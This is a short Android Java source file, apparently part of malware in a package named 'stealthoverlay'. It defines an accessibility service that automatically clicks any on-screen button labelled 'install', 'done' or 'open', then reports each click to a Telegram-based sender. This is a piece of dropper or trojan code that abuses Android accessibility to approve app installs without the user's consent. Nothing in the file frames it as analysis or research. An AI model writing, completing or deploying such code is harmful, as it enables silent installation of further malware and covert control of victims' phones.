package com.example.stealthoverlay;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AutoInstallService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo nodeInfo = event.getSource();
        if (nodeInfo != null) {
            CharSequence text = nodeInfo.getText();
            if (text != null) {
                String textStr = text.toString().toLowerCase();
                if (textStr.contains("install") || textStr.contains("done") || textStr.contains("open")) {
                    nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    TelegramSender.send("🤖 Auto-clicked button: " + textStr);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        // No action needed
    }
}
